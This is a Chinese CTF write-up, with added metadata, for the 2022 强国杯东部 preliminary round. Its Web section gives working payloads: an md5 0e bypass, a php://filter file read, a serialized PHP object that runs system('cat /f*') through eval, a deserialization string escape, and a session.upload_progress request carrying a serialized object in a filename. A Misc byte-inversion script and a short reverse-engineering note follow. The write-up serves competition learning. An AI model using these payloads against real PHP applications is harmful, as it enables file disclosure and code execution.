---
title: 2022 强国杯东部初赛 CTF WriteUp
contest: 2022 强国杯东部初赛
year: 2022
difficulty: medium
vuln_type:
- sqli
- lfi
- rce
- deserialize
- web_unknown
- misc_unknown
- reverse
tags:
- 强国杯
- md5-0e
- php://filter
- LFI
- eval
- 反序列化逃逸
- session-upload-progress
- LFI-to-RCE
- pyinstxtractor
- 字节取反
- hiencode
attack_chain:
- 'md5_php: md5 弱类型比较 ''0e215962017'' 是 0e 开头, ?md5=0e215962017'
- 'LFI: ?le.php?file=php://filter/convert.base64-encode/index/resource=flag'
- '反序列化: main.__construct 调 evil; evil.action eval($this->file) = system(''cat /f*'')'
- 'phpti: session.upload.progress 触发 LFI, file 字段是 |O:5:admin 反序列化 payload'
- 'Misc 平正开: 字节取反 (256-x) 还原 zip → hiencode CV 解码'
- 'Re re2: pyinstxtractor 解包 exe + pyc 反编译 → 改 score=0 直接给 flag'
key_payload: O:4:"main":1:{s:11:"\0*\0ClassObj";O:4:"evil":1:{s:10:"\0evil\0file";s:18:"system("cat /f*");";}
one_liner: 强国杯东部 2022：md5 弱类型 + LFI + 反序列化逃逸 + session-upload LFI
lesson: PHP `__construct` 自动调用是反序列化入门；session.upload.progress LFI 是经典；0e md5 弱类型
quality: high
full_path: 2022强国杯东部_初赛CTF-WriteUp.full.md
meta_path: 2022强国杯东部_初赛CTF-WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2022 强国杯东部初赛 CTF WriteUp。强国杯东部 2022：md5 弱类型 + LFI + 反序列化逃逸 + session-upload LFI。关键路径：md5_php: md5 弱类型比较 ''0e215962017'' 是 0e 开头, ?md5=0e215962017 → LFI: ?le.php?file=php://filter/convert.base64-encod...'
category: web
subcategory: sql_injection
subcategories:
- sql_injection
- lfi
- rce
- deserialization
- web_other
- misc_other
- reverse
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/63358.html
reasoning_chain:
- 'md5_php: 服务端 md5($_GET[md5]) == ''0e...'' 比较 → 触发点：md5 0e 弱类型'
- 假设：'0e215962017' 的 md5 是 0e 开头数字 → 动作：直接传 0e215962017 → 观察：弱类型绕过
- 'LFI: ?le.php?file=php://filter/convert.base64-encode/resource=flag → 假设：经典 php://filter → 观察：base64 出 flag'
- '反序列化: main.__construct → new evil → evil.file=''system(cat /f*)'' → 触发点：构造链'
- 动作：new main; url encode serialize → GET ?a=... → 观察：RCE
- 'phpti: filter(''phpinfo()'') → ''phpinfo()up'' 替换 → 假设：字符串逃逸触发反序列化 password=admin'
- '动作：构造 16 个 phpinfo() 让 s:1:''?'' 变 s:32: 触发闭合 password 字段 → 观察：注入 password=admin'
- 'session.upload.progress LFI: 多 part 上传 + filename=|O:5:admin 反序列化 → 假设：文件名前缀触发反序列化'
- 动作：带 PHPSESSID cookie 上传 filename=|O:5:admin → 观察：触发反序列化 RCE
failed_attempts:
- 试图用 union select 注入 → 失败：SQL 注入点不在 md5_php
- 试图 ?file=../../etc/passwd → 失败：非 php://filter 不能读 PHP 文件源码
- 试图直接反序列化 admin 改 password → 失败：filter 函数替换
key_observations:
- 0e md5 弱类型比较是 PHP 类型 juggling 经典
- 字符串长度替换（phpinfo()→phpinfo()up）触发反序列化逃逸
- 'session.upload_progress + 文件名 |O: 反序列化是 LFI-to-RCE 经典组合'
- PHP __construct 魔术方法自动调用是反序列化入口
prerequisites:
- PHP md5 0e 弱类型与类型 juggling
- php://filter 链 + base64 encode
- PHP 反序列化 __wakeup 触发链
- session.upload_progress + LFI 反序列化组合
---
# 2022强国杯东部 初赛CTF-WriteUp

> 原文: https://www.ctfiot.com/63358.html
> ID: 63358

秀米社团

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。

（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

md5_php

GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:
46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close

http://39.106.153.217:
46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag

2

命令执行

https://www.xiaohongyan.cn/articles/2022/04/27/1651046661350.html

3

反序列化

<?php
class main{ protected $ClassObj;
 function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:
16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D

4

phpti

<?phperror_reporting(0);highlight_string(file_get_contents('sessionti1.php'));class a{ public $uname; public $password; public function __construct($uname,$password){ $this->uname=$uname; $this->password=$password; } public function __wakeup(){ if($this->password==='admin') { highlight_string(file_get_contents('flag.php')); include('flag.php'); } else { echo 'hacker !!!'; } }}
function filter($string){ return str_replace('phpinfo()','phpinfo()up',$string);}
$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?>
<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:
45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025

<form action="http://39.107.81.36:
45787/flag.php" method="POST" enctype="multipart/form-data">   </form>POST /flag.php HTTP/1.1Host: 39.107.81.36:
45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
123-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="file"; filename="|O:5:"admin":1:{s:4:"root";s:36:"print_r(scandir(dirname(__FILE__)));";}"Content-Type: image/png塒NG

02

Misc

1

不要被迷惑

2

PCAP文件分析

3

平正开

dd = open('12.zip','wb')f1 = open('flag44c099db1.zip','rb')for l in f1.read(): if l == 0: dd.write(bytes([0x0])) else:        dd.write(bytes([0x100-l]))dd.close()

然后 http://www.hiencode.com/cvencode.html 解码

03

Re

1

re2

反编译exe后反编译pyc文件

分数达到1000就是flag

score = 0 后直接吐出flag

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:
46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
http://39.106.153.217:
46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag
https://www.xiaohongyan.cn/articles/2022/04/27/1651046661350.html
<?php
class main{ protected $ClassObj;
 function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:
16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D
<?phperror_reporting(0);highlight_string(file_get_contents('sessionti1.php'));class a{ public $uname; public $password; public function __construct($uname,$password){ $this->uname=$uname; $this->password=$password; } public function __wakeup(){ if($this->password==='admin') { highlight_string(file_get_contents('flag.php')); include('flag.php'); } else { echo 'hacker !!!'; } }}
function filter($string){ return str_replace('phpinfo()','phpinfo()up',$string);}
$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?>
<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:
45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025
<form action="http://39.107.81.36:
45787/flag.php" method="POST" enctype="multipart/form-data">   </form>POST /flag.php HTTP/1.1Host: 39.107.81.36:
45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
123-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="file"; filename="|O:5:"admin":1:{s:4:"root";s:36:"print_r(scandir(dirname(__FILE__)));";}"Content-Type: image/png塒NG
dd = open('12.zip','wb')f1 = open('flag44c099db1.zip','rb')for l in f1.read(): if l == 0: dd.write(bytes([0x0])) else:        dd.write(bytes([0x100-l]))dd.close()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]